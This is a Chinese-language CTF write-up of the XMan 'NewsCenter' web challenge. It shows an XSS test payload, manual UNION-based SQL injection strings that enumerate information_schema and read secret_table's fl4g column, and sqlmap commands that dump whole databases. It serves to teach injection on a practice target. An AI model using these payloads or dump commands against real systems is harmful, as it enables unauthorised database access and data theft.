## XMan web NewsCenter SQL注入

**sql注入学习参考：https://www.cnblogs.com/ssooking/p/8137597.html**

**sqlmap使用参考手册：http://zerlong.com/512.html**

#### 思路：

1. 打开题目，有一处搜索框，搜索新闻。考虑xss或sql注入，随便输入一个abc，没有任何搜索结果，页面也没有什么变化，考虑SQL注入。

2. sql注入测试：搜索框中随便输入一个1
   url栏没有请求参数，无论怎么测试页面都没有返回值

3. xss测试：页面也是没有返回值，并且根据源码可以看出，js代码是没有被过滤的，所以这里就不存在xss漏洞

   <script>alert(1)</script>

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190613182509222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0,size_16,color_FFFFFF,t_70)

4. 请求参数去哪了呢？于是又猜测是否是POST请求，我们打开bp，进行抓包查看，哎，有情况
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20190613181959480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0,size_16,color_FFFFFF,t_70)



#### 手动SQL注入

**对information_schema表结构有一定的理解**

1. 首先用 `' and 0 union select 1,2,3 #` 来初步判断该sql查询返回三列数据

   无回显报错 输入的不对就获取网页失败

   ![img](https://img-blog.csdnimg.cn/20190608195547527.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjE1MTYxMQ==,size_16,color_FFFFFF,t_70)

2. 用 `' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #` 得到表名，很明显我们需要得到 `secret_table` 表中的内容

   或

   `1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#`
```sql
在MySQL中，把 information_schema
    看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。

   列出test数据库中所有的表名，类型(普通表还是view)和使用的引擎
     select table_name, table_type, engine
     FROM information_schema.tables
     WHERE table_schema = 'test'
     ORDER BY table_name DESC;
   解释： 对表的meta data的查询需要使用information_schema.tables， table_schema是数据库的名称，table_name是具体的表名，table_type指的是表的类型
```

3. `' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='secret_table'#` 得到 `secret_table` 表的列名以及数据类型

   ![img](https://img-blog.csdnimg.cn/20190608200218788.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjE1MTYxMQ==,size_16,color_FFFFFF,t_70)

   或

   `1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='secret_table'#`

   ![columns](https://img-blog.csdnimg.cn/20190330233947770.png)

4. `' and 0 union select 1,2,fl4g from secret_table #`

   或

   `1' union select 1,2,fl4g from news.secret_table#`





#### 使用sqlmap的自动化注入

##### 常用的SQLmap语句：
```shell
sqlmap -u "注入地址"     --dbs          // 列举数据库
sqlmap -u "注入地址" --tables -D "数据库" // 列举数据库的表名
sqlmap -u "注入地址" --columns -T "表名" -D "数据库" // 获取表的列名
sqlmap -u "注入地址" --dump -C "字段,字段" -T "表名" -D "数据库" // 获取表中的所有数据

sqlmap -r "含http头的文件"     --dbs          // 列举数据库
sqlmap -r "含http头的文件" --tables -D "数据库" // 列举数据库的表名
sqlmap -r "含http头的文件" --columns -T "表名" -D "数据库" // 获取表的列名
sqlmap -r "含http头的文件" --dump -C "字段,字段" -T "表名" -D "数据库" // 获取表中的所有数据
```

#### 题解

将http头保存为1.txt，试试用sqlmap爆数据库
`sqlmap -r 1.txt -dbs`

**参数 文本文件 -r REQUESTFILE Load HTTP request from a file**

很快，爆出数据库
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190430123921231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbGVuY2UxXw==,size_16,color_FFFFFF,t_70)

查看news数据库内容`sqlmap -r 1.txt -D news --dump`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190430124058254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbGVuY2UxXw==,size_16,color_FFFFFF,t_70)
得到flag！

```shell
sqlmap -r xctfrequest.txt -D news --tables
sqlmap -r xctfrequest.txt -D news -T secret_table  --columns
sqlmap -r xctfrequest.txt -D news -T secret_table -C "id,fl4g" --dump
```

一次性把new数据库内的内容全部爆出来，这样就不用一步步找flag在哪了，直接了当，所以对于有目的，好寻找的我们可以使用第一种步步深入；如果比较难找，就第二种方法比较好

`sqlmap -r xctfrequest.txt -D news --dump`

